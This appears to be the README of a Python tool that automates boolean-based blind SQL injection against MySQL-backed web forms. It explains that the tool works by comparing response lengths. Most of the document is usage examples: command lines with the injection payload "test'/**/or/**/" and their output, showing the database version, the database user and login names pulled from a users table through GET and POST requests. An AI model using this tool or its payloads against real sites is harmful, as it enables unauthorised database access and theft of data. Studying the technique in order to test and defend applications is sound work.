# mysql_bb
Boolean-based blind SQL injection exploit for MySQL.

This script attempts to retrieve result of given SQL query by making boolean-based blind injection into supplied HTTP request. Basic concept is the assumption that True and False answers has different Content-Length header and True>False.
## Usage example
Be sure you have no errors in SQL syntax, otherwise it may lead to false negative results. No ending semicolon is needed since given query will be inserted as subquery into substring() MySQL function.
```bash
//Injection into GET "http://localhost/login?username=admin&password=admin"
python3 mysql_bb.py --url "http://localhost/login" --data "username=test&password=test"  --method GET "select version()"
Checking parametr "username" with injection "test'/**/or/**/"
(+) Parametr "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
5.5.47-0+deb8u1
(+) done!

python3 mysql_bb.py --url "http://localhost/login" --data "username=test&password=test"  --method GET "select user()"
Checking parametr "username" with injection "test'/**/or/**/"
(+) Parametr "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
root@localhost

(+) done!
python3 mysql_bb.py --url "http://localhost/login" --data "username=test&password=test"  --method GET "select login from users"
Checking parametr "username" with injection "test'/**/or/**/"
(+) Parametr "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
admin
(+) done!

//Injection into POST "http://localhost/login" with body "username=test&password=test"
python3 mysql_bb.py --url "http://localhost/login" --data "username=test&password=test"  --method POST "select version()"
Checking parametr "username" with injection "test'/**/or/**/"
(+) Parametr "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
5.5.47-0+deb8u1
```
